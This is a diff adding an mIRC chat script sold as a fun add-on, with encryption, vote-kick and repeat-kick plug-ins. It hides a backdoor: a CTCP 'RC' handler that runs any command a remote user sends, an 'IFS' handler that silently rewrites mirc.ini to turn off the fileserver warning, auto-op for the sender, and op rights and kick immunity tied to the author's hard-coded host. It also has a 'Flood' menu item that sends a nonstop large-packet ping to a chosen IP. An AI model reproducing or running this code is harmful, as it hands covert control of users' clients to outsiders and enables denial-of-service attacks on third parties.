@@ -1,0 +1,429 @@
+;S|-|ADO\\' - Script
+
+;User's manual
+;First you have to configure this nice script
+;Simply right click in the channel window, choose "S|=|a–o\\'", then "eXocrypt plug-in" and
+;then click on "Change CODE" and enter "exocrypt.exo". This sets all the neccessary
+;variables to send and receive encrypted messages.
+;For further assistance look at the comments in the plug-ins
+
+menu nicklist {
+  -
+  S|=|a–o\\'
+  .DNS lookup: dns $$1
+  .Show hops to user: {
+    dns $$1
+    run TRACERT $$?="Enter the IP address of $$1 (shown in the STATUS window):"
+  }
+  .Flood
+  ..PING: {
+    set %ipstring $address( $$1 , 2)
+    set %lenofipstring $len(%ipstring)
+    set %newlen %lenofipstring - 4
+    echo IPSTRING: %ipstring
+    unset %lenofipstring
+    set %finalipstring $right(%ipstring,%newlen)
+    echo FINALIPSTRING: %finalipstring
+    unset %ipstring
+    unset %newlen
+    dns %finalipstring
+    run -n PING -l 64000 -t $$?="Enter the IP address of $$1 (shown in the STATUS window):"
+    unset %finalipstring
+  }
+  .-
+  .if user uses S|=|a–o\\'
+  ..Turn his fileserver warning off: .ctcp $$1 IFS
+  ..Remote Control: .ctcp $$1 RC $$?="What commands should (s)he do?"
+  .-
+  .∑¥Ø`∑.∏∏.∑ plug-ins following ∑.∏∏.∑¥Ø`∑:echo †
+  .-
+  .Lame-O-Meter plug-in
+  ..Type 1 (Xtra percentage field): lame1 $$?="Enter percentage/10 (10=100%):" $$1
+  ..Type 2 (Percentage shown behind text): lame2 $$?="Enter percentage/10 (10=100%):" $$1
+}
+
+menu channel {
+  -
+  S|=|a–o\\'
+  .Show stats: shstats
+  .Show users using S|=|a–o\\': showShadows
+  .Who was:whowas $$?="Nickname:"
+  .Clone detection: clonedet $$1
+  .Rejoin channel: part $1 | timer 1 1 join $chan
+  .-
+  .Show color codes: cols
+  .-
+  .∑¥Ø`∑.∏∏.∑ plug-ins following ∑.∏∏.∑¥Ø`∑:echo †
+  .-
+  .eXocrypt plug-in
+  ..Change CODE:Method
+  ..Info about current CODE:MI
+  ..-
+  ..Send crypted message:eXo $$?="Enter text to eXocrypt:"
+  .COMMAND KICKer plug-in
+  ..Turn CK ON:con
+  ..Turn CK OFF:coff
+  ..Show stats of CK:cstat
+  ..-
+  ..Inform channel of CK:cinfo
+  .REPEAT ELIMINATOR plug-in
+  ..Turn RE ON:ron
+  ..Turn RE OFF:roff
+  ..Show stats of RE:rstat
+  ..-
+  ..Inform channel of RE:rinfo 
+}
+
+100:*!RoboCop@*.berlin2m.germany.net
+
+ctcp 1:version:if ( %sr == $null ) { .notice $nick I'm using ä|=|a–o\\' Script by Snowman&RoboCop..... | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,8ATTENTION! $1- from $nick $+ ! }
+ctcp 1:IFS:if ( %sr == $null ) { %mircini = $mircdir $+ mirc.ini | .writeini %mircini fileserver Warning Off | .notice $nick FileServer setting rewritten. User must restart mIRC! | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,4WARNING! $1- from $nick $+ ! }
+ctcp 1:RC:if ( %sr == $null ) { $2- | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,4WARNING! $1- from $nick $+ ! }
+on @+1:text:!opme:#:/.msg $chan 1,11 COMMAND OPer:  User level for $nick 1,4 NOT OK . Try again later, $nick. | /echo -a 1,11 COMMAND OPer:   $nick  requested an OP for $chan. OP refused.
+on @100:text:!opme:#:/.msg $chan 1,11 COMMAND OPer:  User level for $nick 1,9 OK . Giving OP for $chan to  $nick  ... | /.mode $chan +o $nick | /echo -a 1,11 COMMAND OPer:   $nick  requested an OP for $chan. OP granted.
+ctcp 1:INS:if ( %sr == $null ) { .auto $nick | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,4WARNING! $1- from $nick $+ ! }
+ctcp 1:CFS:if ( %sr == $null ) { .notice $nick is using ä|=|a–o\\' | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,8ATTENTION! $1- from $nick $+ ! }
+
+alias cols {
+  /echo -a 0,1Color Table: 1,0 0 0,1 1 0,2 2 0,3 3 0,4 4 0,5 5 0,6 6 1,7 7 1,8 8 1,9 9 0,10 10 1,11 11 0,12 12 1,13 13 0,14 14 1,15 15 
+  /echo -a 0,1Control codes: Bold ---- Underlined ---- Reverse ---- 1,8K - coloured0,1 ---- O - plain
+}
+
+alias shstats {
+  echo -s 1,8S|=|a–o\\' Status
+  echo -s 1,7S|=|a–o\\' was written by RoboCop
+  if %con == 1 { echo -s 1,8COMMAND KICKer is currently 1,4ON }
+  if %con != 1 { echo -s 1,8COMMAND KICKer is currently 1,9OFF }
+  if %ron == 1 { echo -s 1,8REPEAT ELIM is currently 1,4ON }
+  if %ron != 1 { echo -s 1,8REPEAT ELIM is currently 1,9OFF }
+  echo -s 1,8eXocrypt codec is set to 1,11 $+ %N ( $+ %CrypFile $+ )
+  echo -s -----
+}
+
+alias clonedet {
+}
+
+alias ShowShadows {
+  %tempvar = $nick(# , 0)
+  %countvar = 1
+  :SSLabel
+  if $nick(# , %countvar ) != $me {  .echo -a Sending ¢Éä request to " $+ $nick(#, %countvar ) $+ " ... | .CTCP $nick(# , %countvar ) CFS }
+  %countvar = %countvar + 1
+  if %countvar > %tempvar {
+    unset %tempvar
+    unset %countvar
+  }
+  else goto SSLabel
+}
+
+
+;####################################################eXocrypt routine
+;Using eXoCrypt with own codes
+;For using own codes with eXocrypt, you will have to make a new
+;file with contents like:
+;Name <name of your code>
+;Recipients <name for recipients (if you make a code for only you&one other person)>
+;Signature <Signature (must start with ! or it won't work)>
+;Coded <charset coded>
+;Plain <charset plain>
+;and define a
+;new line in this script here:
+;if %try == 1 { %DCrypFile = yourcode.exo | %try = %try + 1 | goto TryAgain }
+;This line must be above the unset %deeXo statement in the ON TEXT-eXocrypt-part
+;For further codes, replace the "%try == 1" with "%try == 2" and so on.
+;
+;Charsets
+;You have to make 2 charsets. One with the plain data and one with the coded data.
+;The format is very simple, e.g. if the plain char in the string after "Plain" is on the 3rd place
+;the coded char has to be on the 3rd place in the string after "Coded". Example:
+;Coded 123
+;Plain ABC
+;This would send 1 instead of A, 2 instead of B and 3 instead of C. All other chars won't be
+;converted.
+
+alias Method {
+  /set %CrypFile $$?1="Enter file to encrypt with (incl. extension)"
+  %S = $read -sSignature %CrypFile
+  %N = $read -sName %CrypFile
+  %R = $read -sRecipients %CrypFile
+  %P = $read -sPlain %CrypFile
+  %C = $read -sCoded %CrypFile
+  /echo -a 1,8 You selected 1,9 %N 1,8 encryption 1,9( $+ %S $+ )1,8. Recipients: 1,9 %R 1,8.
+}
+
+alias MI {
+  /echo -a 0,4 ENCRYPTION METHOD INFO 
+  /echo -a 1,8 Filename: 1,7 %CrypFile 
+  /echo -a 1,8 Signature: 1,7 %S 
+  /echo -a 1,8 Name: 1,7 %N 
+  /echo -a 1,8 Recipients: 1,7 %R 
+  /echo -a 1,8 Charset-Plain: 1,7 %P 
+  /echo -a 1,8 Charset-Coded: 1,7 %C 
+}
+
+alias eXo {
+  /set %eXo $$?1="Enter Text To eXoCrYpT" *2
+  %char = 1
+  :DoItAgain
+  %eXo = $replace(%eXo, $mid(%P,%char,1), $mid(%C,%char,1))
+  %char = %char + 1
+  if %char <= 39 goto DoItAgain
+  unset %char
+  say %S %eXo
+  echo 4 -a < $+ %N coded to %R $+ > $$1-
+  unset %eXo
+}
+
+alias deeXo {
+  %DN = $read -sName %DCrypFile
+  %DR = $read -sRecipients %DCrypFile
+  %DP = $read -sPlain %DCrypFile
+  %DC = $read -sCoded %DCrypFile
+  %char = 1
+  :DoItAgain
+  %deeXo = $replace(%deeXo, $mid(%DC,%char,1), $mid(%DP,%char,1))
+  %char = %char + 1
+  if %char <= 39 goto DoItAgain
+  unset %char
+  ECHO 4 $chan < $+ %DN coded from %exonick $+ > %deeXo
+  unset %deeXo
+  unset %exonick
+  unset %DN
+  unset %DR
+  unset %DP
+  unset %DC
+  unset %DCrypFile
+}
+
+ON 1:TEXT:!*:*:{
+  set %Sign $parm1
+  set %deeXo $parm2*
+  set %eXonick $nick
+  %DCrypFile = exocrypt.exo
+  %try = 1
+  :TryAgain
+  %CS = $read -sSignature %DCrypFile
+  if %Sign == %CS {
+    deeXo
+    unset %try
+    unset %CS
+    unset %Sign
+    goto EndOfThis
+  }
+  if %try == 1 { %DCrypFile = loops.exo | %try = %try + 1 | goto TryAgain }
+  if %try == 2 { %DCrypFile = sha–ow.exo | %try = %try + 1 | goto TryAgain }
+  unset %deeXo
+  unset %eXonick
+  unset %try
+  :EndOfThis
+}
+
+ON 1:CHAT:!X!*:{
+  set %deeXo $parm2*
+  set %eXonick $nick
+  deeXo
+}
+;#################################################eXocrypt ends here
+
+;############################################COMMAND KICKer routine
+; COMMAND KICKer v2.5 (08-01-1997)
+; FunScript for mIRC
+; developed by RoboCop (irc.germany.net)
+; Usage:
+; Anyone (except you) can type !kick <nick> to kick the desired nickname. The user of the script can't be kicked by the script.
+; After the !kick-command 5 different(!) other chatters (this means not you and not <nick>) have now the choice to agree by typing
+; in YES or to disagree by typing NO. If s.o. agrees, CK will count it - if there are 5 agreements <nick> is no more ;-)
+; If s.o. disagrees CK will completely interrupt the Kicking process. Someone will have to start again. Simple, isn't it?
+; Also every user joining a channel, which you are on will be instantly informed of this script. You can also type /cinfo to let the
+; others know, what script you're using (in case of s.o. has forgotten it). Have much fun with this.
+; You can switch the script on by typing /con, off with /coff and to view the current status type /cstat.
+; This script only works if you got the OP (@) status!
+
+alias cinfo /amsg 1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4 WARNING 4,1 AGAINST 1,4 SCRIPTS 4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\ | /ame is using 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ by RoboCop _.∑¥Ø) (Type !kick <nick> to kick <nick>.)
+
+alias con /msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is now 9activated!! | /set %con 1
+
+alias coff {
+  /msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is now 4disactivated!!
+  /unset %con
+  /unset %kick
+  /unset %kick1
+  /unset %kick2
+  /unset %kick3
+  /unset %kick4
+  /unset %y
+  /unset %vip
+}
+
+alias cstat {
+  if %con == 1 /set %stat 9activated
+  if %con != 1 /set %stat 4disactivated
+  /echo -a 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is currently %stat $+ !!
+  /unset %stat
+}
+
+alias alrv {
+  /.msg $$1 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Be fair, $$2 ( %vip ). You had your voice already!
+  /unset %vip
+  /halt
+}
+
+on @1:join:#:if (( $nick != $me ) && ( %con == 1 )) { /.notice $nick $me is using 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ by RoboCop _.∑¥Ø) (Type !kick <nick> to kick <nick>.) | /echo -a 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick has been informed that you're using me. }
+
+on @1:text:!kick *:#:{
+  if ( %con != 1 ) { /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is currently 9disabled!! | /halt }
+  %kick = $2
+  %y = 0
+  if %kick == $me {
+    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requests a kick for $me. Kick aborted.
+    goto Dontkick
+  }
+  if %kick isprotect {
+    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requests a kick for %kick $+ . Kick aborted because %kick is in $me's protect list.
+    goto Dontkick
+  }
+  if %kick == RoboCop {
+    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requested a kick for %kick $+ . Kick aborted because %kick is a protected name.
+    goto Dontkick
+  }
+  if %kick ison $chan {
+    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requests a kick for %kick - 5 of you have to agree, just write YES
+    /halt
+  }
+  /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requested a kick for a user not existing in this room. Kick aborted.
+  :Dontkick
+  /unset %kick
+  /unset %y
+}
+
+
+on @1:text:YES:#:{
+  if ( %con != 1 ) halt
+  %vip = $address($nick,2)
+  if (($nick != %kick) && (%kick != $null)) {
+    if ((%kick1 != $null) && (%kick1 == %vip)) alrv $chan $nick
+    elseif (%kick1 == $null) { set %kick1 %vip | goto conthere }
+    
+    if ((%kick2 != $null) && (%kick2 == %vip)) alrv $chan $nick
+    elseif (%kick2 == $null) { set %kick2 %vip | goto conthere }
+    
+    if ((%kick3 != $null) && (%kick3 == %vip)) alrv $chan $nick
+    elseif (%kick3 == $null) { set %kick3 %vip | goto conthere }
+    
+    if ((%kick4 != $null) && (%kick4 == %vip)) alrv $chan $nick
+    elseif (%kick4 == $null) { set %kick4 %vip | goto conthere }
+    :conthere
+    %y = %y + 1
+    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Agreement No. %y by $nick ...
+    if %y == 5 {
+      /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Kick agreed by 5 different users. Kicking %kick ... _.∑¥Ø)
+      /.kick $chan %kick Five users agreed to kick you. Sorry!
+      /unset %kick
+      /unset %kick1
+      /unset %kick2
+      /unset %kick3
+      /unset %kick4
+      /unset %y
+      /unset %vip
+    }
+  }
+  elseif (%kick == $nick) /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Sorry, $nick, but it wouldn't be fair to let you vote.
+}
+
+on @1:text:NO:#:{
+  if ( %con != 1 ) halt
+  if ((%kick != $null) && (%kick != $nick)) {
+    /unset %y
+    /unset %kick
+    /unset %kick1
+    /unset %kick2
+    /unset %kick3
+    /unset %kick4
+    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Kick cancelled by $nick
+  }
+  elseif (%kick == $nick) /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Sorry, $nick, but I cannot allow you to stop your death command. Life is unjust, eh?
+}
+;###########################################COMMAND KICKer ends here
+
+;##########################################REPEAT ELIMINATOR routine
+;Repeat Eliminator v1.0 (08-01-1997)
+; FunScript for mIRC
+; developed by RoboCop (irc.germany.net)
+; Usage:
+; Just load this script and enjoy. If someone repeats his statement, RE will warn him. If he repeats it again, he will get the 2nd
+; warning. But if he repeats it once again, he will be kicked outa tha room. You and your protected friends can't be kicked, because
+; your statements doesn't trigger the text-event and if someone protected repeats something, RE won't punish him ;-).
+; With /ron and /roff you can trigger the status of RE which is shown with /rstat.
+; This script only works if you got the OP (@) status!
+
+alias rinfo /amsg 1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4 WARNING 4,1 AGAINST 1,4 SCRIPTS 4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\ | /ame is using 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ by RoboCop _.∑¥Ø)
+
+alias ron /msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ is now 9activated!! | /set %ron 1
+
+alias roff /msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ is now 4disactivated!! | /unset %ron
+
+alias rstat {
+  if %ron == 1 /set %stat 9activated
+  if %ron != 1 /set %stat 4disactivated
+  /echo -a 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ is currently %stat $+ !!
+  /unset %stat
+}
+
+on @1:join:#:if (( $nick != $me ) && ( %ron == 1 )) { /.notice $nick $me is using 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ by RoboCop _.∑¥Ø) | /echo -a 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ $nick has been informed that you're using me. }
+
+on @1:text:*:#:{
+  if (( $nick isprotect ) || ( $nick == RoboCop ) || ( %ron != 1 )) /halt
+  if ( $1- != %text ) {
+    /set %text $1-
+    /set %rnick $nick
+    /set %t 0
+    /halt
+  }
+  if (( $1- == %text ) && ( %rnick == $nick ) && ( %t == 0 )) {
+    /.msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ 9,9__ Hey $nick $+ ! Don't repeat it. We have understood.
+    %t = %t + 1
+    /halt
+  }
+  if (( $1- == %text ) && ( %rnick == $nick ) && ( %t == 1 )) {
+    /.msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ 8,8__ $nick $+ ! This is your 2nd warning! Once again, and I kick ya ass!
+    %t = %t + 1
+    /halt
+  }
+  if (( $1- == %text ) && ( %rnick == $nick ) && ( %t == 2 )) {
+    /.msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ 4,4__ I warned you, $nick! Kicking $nick .... _.∑¥Ø)
+    /kick $chan $nick Kicked by the 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ by RoboCop
+    /set %t 0
+  }
+}
+;########################################REPEAT ELIMINATOR ends here
+;################################################Lame-O-Meters routine
+alias lame1 {
+  %z = 0
+  :Addanother
+  if ( %z < $$1 ) { %z = %z + 1 | %ls = %ls $+ _ | goto Addanother }
+  :Addan2
+  if ( %z < 10 ) { %z = %z + 1 | %rs = %rs $+ _ | goto Addan2 }
+  /.msg $chan 0,12Lame-O-Meter: 7,12 $$2 is 9,9 $+ %ls $+ 3,3 $+ %rs $+ 9,12 $$1 $+ 0 % $+ 7 lame.
+  /unset %z
+  /unset %ls
+  /unset %rs
+}
+
+alias lame2 {
+  %tx = Lame-O-Meter: $$2 is $$1 $+ 0 % lame.
+  %lt = $len( %tx ) * 10
+  %lp = %lt * $$1
+  %lp = %lp / 100
+  %rp = $len( %tx )
+  %rp = %rp - %lp
+  %t1 = $left( %tx , %lp )
+  %t2 = $right( %tx , %rp )
+  /.msg $chan 1,8 $+ %t1 $+ 8,1 $+ %t2 $+ 
+  /unset %tx
+  /unset %lt
+  /unset %lp
+  /unset %rp
+  /unset %t1
+  /unset %t2
+}
+;###############################################Lame-O-Meters end here
